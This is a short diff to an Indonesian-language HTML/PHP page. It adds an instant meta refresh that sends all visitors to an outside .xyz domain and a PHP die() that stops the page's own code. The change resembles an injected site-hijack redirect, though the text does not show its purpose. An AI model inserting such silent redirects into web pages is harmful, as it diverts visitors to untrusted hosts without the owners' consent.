@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <html lang="id-ID">
-<meta http-equiv="refresh" content="0; url=http://sirhuka.xyz/">
+
 
 <head>
-    <?php require_once('inc/asc.php'); ?>
+    <meta http-equiv="refresh" content="0; url=http://sirhuka.xyz/">
+    <?php die();
+    require_once('inc/asc.php'); ?>
     <script src="https://use.fontawesome.com/07cae87f83.js"></script>
 </head>
 
